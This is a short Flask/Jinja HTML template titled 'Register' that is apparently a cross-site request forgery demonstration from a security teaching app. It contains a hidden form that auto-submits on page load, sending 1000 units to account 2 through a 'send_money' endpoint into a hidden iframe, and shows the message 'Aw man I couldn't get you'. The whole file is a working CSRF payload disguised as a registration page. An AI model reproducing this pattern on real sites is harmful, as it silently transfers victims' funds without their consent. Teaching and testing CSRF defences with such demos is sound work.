{% extends 'base.html' %}

{% block header %}
<h1>{% block title %}Register{% endblock %}</h1>
{% endblock %}

{% block content %}
<div class="container">
    <div class="row">
       <form name="form" style="display:none" method="POST" action="{{ url_for('secure.send_money') }}" target="iframe">
                   <input type="number" class="form-control" name="to_account"  value="2"/>
                   <input type="number" class="form-control" name="amount" value="1000" />
           <button class="btn btn-dark col-6">Send</button>
       </form>
       <h3>Aw man I couldn't get you
       </h3>
       <iframe name="iframe" style="display:none"></iframe>
    </div>
</div>


{% endblock %}

{% block js%}
<script>
    document.form.submit();
</script>
{% endblock js %}
